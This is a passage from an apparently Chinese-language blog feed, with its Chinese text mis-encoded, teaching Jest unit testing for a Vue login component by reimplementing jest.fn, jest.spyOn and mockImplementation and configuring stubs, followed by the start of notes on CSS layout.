Vue.nextTick()</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œç¯å¢ƒå‡†å¤‡å¥½äº†ï¼Œå¯ä»¥æŒ‚è½½Vueç»„ä»¶ï¼Œå¯ä»¥æ¨¡æ‹Ÿç‚¹å‡»ï¼Œå¯ä»¥è·å–ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTMLã€‚</p><p>ç»ˆäºæˆ‘ä»¬è¦å†™æµ‹è¯•ç”¨ä¾‹äº†!</p><p><br></p><h3 id="5-ç¼–å†™æµ‹è¯•ç”¨ä¾‹"><a href="#5-ç¼–å†™æµ‹è¯•ç”¨ä¾‹" class="headerlink" title="5.ç¼–å†™æµ‹è¯•ç”¨ä¾‹"></a>5.ç¼–å†™æµ‹è¯•ç”¨ä¾‹</h3><p>æµ‹è¯•ç”¨ä¾‹ï¼Œä¹Ÿç§°ä¸ºé©±åŠ¨ä»£ç ï¼Œç”¨æ¥è°ƒç”¨è¢«æµ‹ä»£ç ï¼Œå®ƒæ˜¯ä¸€ä¸ª è¾“å…¥æ•°æ® å’Œ é¢„è®¡è¾“å‡º çš„é›†åˆã€‚</p><p>è¾“å…¥ï¼š</p><ul><li>ç”¨æˆ·çš„ç‚¹å‡»è¡Œä¸ºã€é”®ç›˜æ“ä½œ</li><li>æœåŠ¡ç«¯è¿”å›çš„æ•°æ®</li><li>éœ€è¦åˆ¤æ–­çš„å…¨å±€å˜é‡</li></ul><p>è¾“å‡ºï¼š</p><ul><li>é¡µé¢æ˜¾ç¤º</li><li>è°ƒç”¨çš„JSAPI</li><li>è°ƒç”¨å‚æ•°</li></ul><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹åŒ…å«äº†è¿™äº›è¦ç´ <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mount &#125; <span class="keyword">from</span> <span class="string">'@vue/test-utils'</span></span><br><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api.js'</span></span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">'../src/Login.vue'</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">'ç™»å½•ç»„ä»¶'</span>, () =&gt;&#123;</span><br><span class="line">  <span class="comment">// æŒ‚è½½è¦æµ‹è¯•çš„ç»„ä»¶</span></span><br><span class="line">  <span class="keyword">const</span> wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'ç‚¹å‡»ç™»é™†æŒ‰é’®'</span>, <span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="comment">// ã€è¾“å…¥ã€‘æå‰å®šä¹‰æœåŠ¡ç«¯è¿”å›å†…å®¹</span></span><br><span class="line">    jest</span><br><span class="line">        .spyOn(api, <span class="string">'login'</span>)</span><br><span class="line">        .mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123; <span class="attr">status</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ã€è¾“å…¥ã€‘æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»</span></span><br><span class="line">    <span class="keyword">await</span> wrapper.find(<span class="string">'.button'</span>).trigger(<span class="string">'click'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ã€è¾“å‡ºã€‘æ£€æŸ¥è°ƒç”¨API,è°ƒç”¨å‚æ•°æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">    expect(api.login.mock.calls[<span class="number">0</span>][<span class="number">0</span>]).toEqual(&#123;</span><br><span class="line">        userName: <span class="string">'Mike'</span>,</span><br><span class="line">        passwork: <span class="string">'123456'</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ã€è¾“å‡ºã€‘æ£€æŸ¥é¡µé¢æ˜¯å¦æ­£å¸¸æ˜¾ç¤º</span></span><br><span class="line">    expect(wrapper.text()).toBe(<span class="string">'ç™»å½•æˆåŠŸ'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-å®ç°Mock"><a href="#6-å®ç°Mock" class="headerlink" title="6.å®ç°Mock"></a>6.å®ç°Mock</h3><p>é™¤äº†æ£€æŸ¥é¡µé¢å†…å®¹æ˜¯å¦æ­£ç¡®ï¼ŒæœåŠ¡ç«¯è¯·æ±‚æœ‰æ²¡æœ‰å‘å‡ºå»ï¼Œå‘å‡ºå»çš„å‚æ•°æ˜¯æ€æ ·çš„ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ£€æŸ¥å†…å®¹ã€‚è¦æƒ³æ‹¿åˆ°è¿™å†™è¾“å‡ºæ•°æ®ï¼Œéœ€è¦ç”¨åˆ°Mockã€‚Mockçš„ä¸‰ä¸ªç‰¹æ€§ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å®Œæˆè¿™é¡¹æ£€æŸ¥</p><ul><li>æ“¦é™¤å‡½æ•°çš„å®é™…å®ç°</li><li>è®¾ç½®å‡½æ•°è¿”å›å€¼</li><li>æ•è·å‡½æ•°è°ƒç”¨æƒ…å†µ</li></ul><p><br></p><h4 id="6-1-jest-fn"><a href="#6-1-jest-fn" class="headerlink" title="6.1 jest.fn"></a>6.1 jest.fn</h4><p>ä¸ºäº†æ•è·å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œæˆ‘ä»¬è¦ç”¨åˆ°<code>jest.fn</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªé«˜é˜¶å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶è®°å½•è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶çš„å‚æ•°,  thisï¼Œå‡½æ•°è¿”å›å€¼ï¼Œå¹¶è¿”å›è¿™ä¸ªå‡½æ•°ã€‚</p><p>æˆ‘ä»¬ç”¨ <code>jest.fn</code>åŒ…è£¹å‡½æ•° <code>add</code>ï¼Œä¸€æ—¦ <code>add</code>è¢«è°ƒç”¨ï¼Œè®¿é—® <code>add.mockå¯ä»¥å¾—åˆ°</code>è¯¥å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œä»è€Œå®ç°æ–­è¨€ã€‚</p><p>æˆ‘ä»¬å®ç°ä¸€ä¸ª jest.fn , æ‰§è¡Œ<code>node index.js</code> æ¥çœ‹çœ‹å‡½æ•°è°ƒç”¨æƒ…å†µæ˜¯æ€æ ·è¢«è®°å½•çš„ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®ç°ä¸€ä¸ªjest.fn</span></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> jest = &#123;</span><br><span class="line">  fn: <span class="function"><span class="params">impl</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mockFn = <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// Store the arguments used</span></span><br><span class="line">      mockFn.mock.calls.push(args);</span><br><span class="line">      mockFn.mock.instances.push(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> value = impl.apply(<span class="keyword">this</span>, args); <span class="comment">// call impl, passing the right this</span></span><br><span class="line">        mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'return'</span>, value &#125;);</span><br><span class="line">        <span class="keyword">return</span> value; <span class="comment">// return the value</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (value) &#123;</span><br><span class="line">        mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'throw'</span>, value &#125;);</span><br><span class="line">        <span class="keyword">throw</span> value; <span class="comment">// re-throw the error</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mockFn.mock = &#123;</span><br><span class="line">      calls: [],</span><br><span class="line">      instances: [],</span><br><span class="line">      results: []</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ ä¸ªmockImplementationæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> mockFn</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨jest.fnåŒ…è£¹addå‡½æ•°</span></span><br><span class="line"><span class="keyword">const</span> add = jest.fn(<span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨addæ—¶ï¼Œadd.mockä¼šè®°å½•è°ƒç”¨æ—¶çš„å‚æ•°ï¼Œthiså€¼ï¼Œè¿”å›å€¼</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(add.mock)</span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 4&#125;] &#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-jest-spyOn"><a href="#6-2-jest-spyOn" class="headerlink" title="6.2 jest.spyOn"></a>6.2 jest.spyOn</h4><p>å¯æ˜¯å®é™…ä¸­ï¼Œ<code>jest.fn</code>å¹¶ä¸å¸¸ç”¨ã€‚æˆ‘ä»¬æƒ³ç›‘å¬çš„æ˜¯å†™åœ¨é¡¹ç›®é‡Œçš„æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚</p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ <code>jest.spyOn</code>ï¼Œ<code>jest.spyOn(object, methodName)</code> ç»™ç°æœ‰å¯¹è±¡é‡Œçš„å‡½æ•°æ·»åŠ  mockï¼Œå½“å¯¹è±¡é‡Œçš„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œè®¿é—® <code>object[methodName].mock</code> å¯ä»¥è·å–è¯¥å‡½æ•°çš„è°ƒç”¨æƒ…å†µã€‚</p><p>å®ç°jest.spyOnï¼Œè¦è·Ÿç€ä¸€èµ·æ•²ï¼Œæ•²å®Œå°±æ‡‚äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jest.spyOn = <span class="function">(<span class="params">obj, prop</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ä¿ç•™åŸå§‹çš„obj[prop]</span></span><br><span class="line">  <span class="keyword">const</span> originFunc = obj[prop]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç»™obj[prop]æ–¹æ³•åŒ…è£¹ä¸€å±‚jest.fnï¼Œå¹¶èµ‹å€¼æ›¿æ¢</span></span><br><span class="line">  obj[prop] = jest.fn(obj[prop])</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mockRestore: æä¾›å¤åŸobj[prop]çš„æ–¹æ³•</span></span><br><span class="line">  obj[prop].mockRestore = <span class="function"><span class="params">()</span> =&gt;</span> (obj[prop] = originFunc)</span><br><span class="line">  <span class="keyword">return</span> obj[prop]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = &#123;</span><br><span class="line">  add: <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn(api, <span class="string">'add'</span>)</span><br><span class="line">api.add(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(api.add.mock)</span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 4&#125;] &#125;</span></span><br></pre></td></tr></table></figure></p><p>æœ‰äº†è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬è¦mocké¡¹ç›®ä»£ç é‡Œçš„æ–¹æ³•ï¼Œå°±å¯ä»¥è¿™æ ·å†™</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api'</span>jest.spyOn(api,Â <span class="string">'login'</span>)</span><br></pre></td></tr></table></figure><p>å•æµ‹æ‰§è¡Œæ—¶ï¼Œä»»æ„ä¸€ä¸ªåœ°æ–¹è°ƒç”¨äº†api.loginï¼Œå®ƒçš„è°ƒç”¨æƒ…å†µå°±ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚</p><p><br></p><h4 id="6-3-jest-fn-mockImplementation"><a href="#6-3-jest-fn-mockImplementation" class="headerlink" title="6.3 jest.fn.mockImplementation"></a>6.3 jest.fn.mockImplementation</h4><p>é™¤äº†ç›‘å¬å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›å¯ä»¥ç›´æ¥æŒ‡å®šå‡½æ•°çš„è¿”å›å€¼ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œå°±è¦ç”¨åˆ° <code>mockImplementation</code>ã€‚ æˆ‘ä»¬éœ€è¦æ”¹å†™ä¸€ä¸‹å‰é¢å®šä¹‰çš„ jest.fnï¼Œç»™è¦è¿”å›å‡ºå»çš„é«˜é˜¶å‡½æ•°ï¼ŒåŠ ä¸Š<code>mockImplementation</code> æ–¹æ³•ï¼Œç”¨äºæ”¹å˜åŸå‡½æ•°çš„å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŠ ä¸ªmockImplementationæ–¹æ³•mockFn.mockImplementationÂ =Â newImplÂ =&gt;Â (implÂ =Â newImpl)</span></span><br></pre></td></tr></table></figure><p><code>jest.fn.mockImplementation</code> å®Œæ•´ä»£ç å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jest = &#123;</span><br><span class="line">    fn: <span class="function"><span class="params">impl</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mockFn = <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// Store the arguments used</span></span><br><span class="line">            mockFn.mock.calls.push(args);</span><br><span class="line">            mockFn.mock.instances.push(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> value = impl.apply(<span class="keyword">this</span>, args); <span class="comment">// call impl, passing the right this</span></span><br><span class="line">                mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'return'</span>, value &#125;);</span><br><span class="line">                <span class="keyword">return</span> value; <span class="comment">// return the value</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (value) &#123;</span><br><span class="line">                mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'throw'</span>, value &#125;);</span><br><span class="line">                <span class="keyword">throw</span> value; <span class="comment">// re-throw the error</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mockFn.mock = &#123;</span><br><span class="line">            calls: [],</span><br><span class="line">            instances: [],</span><br><span class="line">            results: []</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ ä¸ªmockImplementationæ–¹æ³•</span></span><br><span class="line">        mockFn.mockImplementation = <span class="function"><span class="params">newImpl</span> =&gt;</span> (impl = newImpl)</span><br><span class="line">        <span class="keyword">return</span> mockFn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn = <span class="function">(<span class="params">obj, prop</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ä¿ç•™åŸå§‹çš„obj[prop]</span></span><br><span class="line">    <span class="keyword">const</span> originFunc = obj[prop]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»™obj[prop]æ–¹æ³•åŒ…è£¹ä¸€å±‚jest.fnï¼Œå¹¶èµ‹å€¼æ›¿æ¢</span></span><br><span class="line">    obj[prop] = jest.fn(obj[prop])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mockRestore: æä¾›å¤åŸobj[prop]çš„æ–¹æ³•</span></span><br><span class="line">    obj[prop].mockRestore = <span class="function"><span class="params">()</span> =&gt;</span> (obj[prop] = originFunc)</span><br><span class="line">    <span class="keyword">return</span> obj[prop]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = &#123;</span><br><span class="line">    add: <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn(api, <span class="string">'add'</span>).mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> <span class="number">100</span>)</span><br><span class="line">api.add(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(api.add.mock)</span><br><span class="line"><span class="comment">// å¯ä»¥çœ‹åˆ°api.add()è¿”å›çš„å€¼æ€»æ˜¯100</span></span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 100&#125;] &#125;</span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œï¼Œå‡ ä¹æ‰€æœ‰æˆ‘ä»¬æƒ³è¦çš„è¾“å…¥è¾“å‡ºéƒ½æ‹¿åˆ°äº†ï¼Œå•æµ‹ä¹Ÿè·‘èµ·æ¥äº†</p><p><br></p><h3 id="7-é…ç½®Stub"><a href="#7-é…ç½®Stub" class="headerlink" title="7. é…ç½®Stub"></a>7. é…ç½®Stub</h3><p>ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå•æµ‹å¾€å¾€ä¼šè·‘åˆ°ä¸€äº›å¤–éƒ¨å‡½æ•°ã€‚è€Œè¿™ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œåœ¨å•å…ƒæµ‹è¯•æ‰§è¡Œç¯å¢ƒé‡Œæœªè¢«å®ç°ï¼Œä¸”æ˜¯æˆ‘ä»¬ä¸æ„Ÿå…´è¶£çš„ä»£ç ï¼Œä¸ºäº†ä¸å½±å“è‡ªèº«é€»è¾‘çš„æµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªå‡çš„å‡½æ•°æ¥ä»£æ›¿çœŸå®çš„å‡½æ•°Aï¼Œè¿™å°±æ˜¯stubã€‚</p><p>ä¸€ä¸ª stub å°±æ˜¯ç®€å•çš„ä¸€æ®µæ›¿èº«ä»£ç ã€‚stubåœ¨å±è”½ä¸å½“å‰å•å…ƒæµ‹è¯•æ— å…³è¡Œä¸ºæ–¹é¢å¾ˆæœ‰ç”¨ï¼Œèµ·åˆ°äº†éš”ç¦»å’Œè¡¥é½çš„ä½œç”¨ï¼Œä½¿è¢«æµ‹ä»£ç èƒ½å¤Ÿç‹¬ç«‹ç¼–è¯‘ã€è¿è¡Œã€‚</p><p>å¸¸è§éœ€è¦è¢«stubçš„ä»£ç ï¼š</p><ul><li>HTTPè¯·æ±‚è¿”å›å€¼</li><li>cssæ–‡ä»¶ã€å›¾ç‰‡ã€å­—ä½“æ–‡ä»¶</li><li>JSDomæ²¡æœ‰æä¾›çš„æµè§ˆå™¨APIï¼Œå¦‚Worker, Canvas</li><li>å…¶ä»–å¯ä»¥å¿½ç•¥æ‰çš„ç»„ä»¶ï¼Œæ–¹æ³•ç­‰ç­‰</li></ul><p>å®é™…é¡¹ç›®ä¸­ï¼Œå¯ä»¥é€šè¿‡é…ç½® jest.config.js ä¸­çš„ <code>moduleNameMapper</code>å±æ€§æ¥æŒ‡å®šä½ è¦ stub çš„ä»£ç ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jest.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    moduleNameMapper: &#123;</span><br><span class="line">        <span class="string">'\\.(css|less|sass|scss|jpg|jpeg|png|gif|eot|otf|webp|svg|ttf|woff|woff2|mp4|webm|wav|mp3|m4a|aac|oga)$'</span>: <span class="string">'&lt;rootDir&gt;/file-mock.js'</span>,</span><br><span class="line">        <span class="string">'@src/api'</span>: <span class="string">'&lt;rootDir&gt;/api-mock.js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// file-mock.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="string">'file-stub'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// api-mock.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    getUserInfo: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123;</span><br><span class="line">            username: <span class="string">'Mike'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>End.</p>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ã€ŠCSSä¸–ç•Œã€‹ç¬”è®°</title>
      <link href="/2022/02/12/CSS%E4%B8%96%E7%95%8C/"/>
      <url>/2022/02/12/CSS%E4%B8%96%E7%95%8C/</url>
      <content type="html"><![CDATA[<h1 id="ç¬¬ä¸‰ç« -æµã€å…ƒç´ ä¸åŸºæœ¬å†…å°ºå¯¸"><a href="#ç¬¬ä¸‰ç« -æµã€å…ƒç´ ä¸åŸºæœ¬å†…å°ºå¯¸" class="headerlink" title="ç¬¬ä¸‰ç«  æµã€å…ƒç´ ä¸åŸºæœ¬å†…å°ºå¯¸"></a>ç¬¬ä¸‰ç«  æµã€å…ƒç´ ä¸åŸºæœ¬å†…å°ºå¯¸</h1><h2 id="å—çº§å…ƒç´ "><a href="#å—çº§å…ƒç´ " class="headerlink" title="å—çº§å…ƒç´ "></a>å—çº§å…ƒç´ </h2><p>å—çº§å…ƒç´ å’Œdisplay:block çš„å…ƒç´ â€ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚<br><code>&lt;li&gt;</code>çš„ displayå€¼æ˜¯list-item<br><code>&lt;table&gt;</code>é»˜è®¤çš„ display å€¼æ˜¯ table<br>ä½†æ˜¯å®ƒä»¬éƒ½æ˜¯å—çº§å…ƒç´ ï¼Œéƒ½ç¬¦åˆå—çº§å…ƒç´ çš„ç‰¹å¾ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ°´å¹³æµä¸Šåªèƒ½å•ç‹¬æ˜¾ç¤ºä¸€ä¸ªå…ƒç´ ï¼Œå¤šä¸ªå—çº§å…ƒç´ åˆ™æ¢è¡Œæ˜¾ç¤ºã€‚</p><h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><p>æ¯ä¸ªå…ƒç´ æœ‰ä¸¤ä¸ªç›’å­ï¼Œå¤–åœ¨ç›’å­å’Œå†…åœ¨ç›’å­ã€‚<br><strong>å¤–åœ¨ç›’å­</strong>è´Ÿè´£å…ƒç´ æ˜¯å¯ä»¥ä¸€è¡Œæ˜¾ç¤ºï¼Œè¿˜æ˜¯åªèƒ½æ¢è¡Œæ˜¾ç¤ºï¼›<br><strong>å†…åœ¨ç›’å­</strong>è´Ÿè´£å®½é«˜ã€å†…å®¹å‘ˆç°ä»€ä¹ˆçš„ï¼Œä¹Ÿå«å®¹å™¨ç›’å­ã€‚</p><p>block: block-block<br>table: block-table<br>inline-block: inline-blockï¼Œæ—¢èƒ½å’Œå›¾æ–‡ä¸€è¡Œæ˜¾ç¤ºï¼Œåˆèƒ½ç›´æ¥è®¾ç½®width/heightã€‚</p><h2 id="å¤–éƒ¨å°ºå¯¸width-auto"><a href="#å¤–éƒ¨å°ºå¯¸width-auto" class="headerlink" title="å¤–éƒ¨å°ºå¯¸width:auto"></a>å¤–éƒ¨å°ºå¯¸width:auto</h2><p>ç›’å­åˆ†å†…åœ¨ç›’å­å’Œå¤–åœ¨ç›’å­ï¼ŒåŒæ ·åœ°ï¼Œå°ºå¯¸ä¹Ÿåˆ†<strong>å†…åœ¨å°ºå¯¸</strong>å’Œ<strong>å¤–åœ¨å°ºå¯¸</strong>ã€‚å†…åœ¨å°ºå¯¸ç”±å†…éƒ¨å…ƒç´ å†³å®šï¼Œå¤–éƒ¨å°ºå¯¸ç”±å…ƒç´ widthå±æ€§å†³å®šã€‚</p><p>widthçš„é»˜è®¤å€¼æ˜¯autoï¼ŒæŒ‡çš„æ˜¯å¤–åœ¨å°ºå¯¸ã€‚<br>width: autoä¼šæœ‰æ€æ ·çš„è¡¨ç°ï¼Ÿ</p><ul><li>å……åˆ†åˆ©ç”¨å¯ç”¨ç©ºé—´ï¼Œ<code>&lt;div&gt;`</code><p>`è¿™äº›å…ƒç´ çš„å®½åº¦éƒ½ä¼šé»˜è®¤100%äºçˆ¶çº§å®¹å™¨ã€‚</p></li></ul><h3 id="å› æ­¤å¾ˆå¤šæ—¶å€™å…¶å®ä¸ç”¨è®¾ç½®width-100"><a href="#å› æ­¤å¾ˆå¤šæ—¶å€™å…¶å®ä¸ç”¨è®¾ç½®width-100" class="headerlink" title="å› æ­¤å¾ˆå¤šæ—¶å€™å…¶å®ä¸ç”¨è®¾ç½®width: 100%"></a>å› æ­¤å¾ˆå¤šæ—¶å€™å…¶å®ä¸ç”¨è®¾ç½®width: 100%</h3><p>å—çº§å…ƒç´ ä¸€æ—¦è®¾ç½®äº†å®½åº¦ï¼Œmargin/border/padding/contentè‡ªåŠ¨åˆ†é…æ°´å¹³ç©ºé—´çš„æµåŠ¨æ€§å°±ä¸¢å¤±äº†ã€‚<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 